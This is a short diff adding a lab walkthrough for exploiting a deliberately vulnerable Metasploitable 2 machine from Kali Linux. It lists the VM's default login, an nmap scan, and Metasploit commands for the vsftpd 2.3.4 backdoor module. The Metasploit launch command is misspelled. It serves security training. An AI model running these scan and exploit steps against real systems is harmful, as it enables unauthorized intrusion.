@@ -1,0 +1,9 @@
+Tools: Kali Linux and Metasploitable 2 Machines
+Log in to Metasploitable (Username: msfadmin, Password: msfadmin)
+Find the target's ip address: ifconfig (192.168.56.101)
+On your kali machine type: nmap -A 192.168.56.101
+The attack phase is taking place in your Kali:
+Open Metasploit: mfsconsole
+Select the Exploit: use exploit/unix/ftp/vsftpd_234_backdoor
+Set the target: set RHOST 192.168.56.101
+Execute: exploit
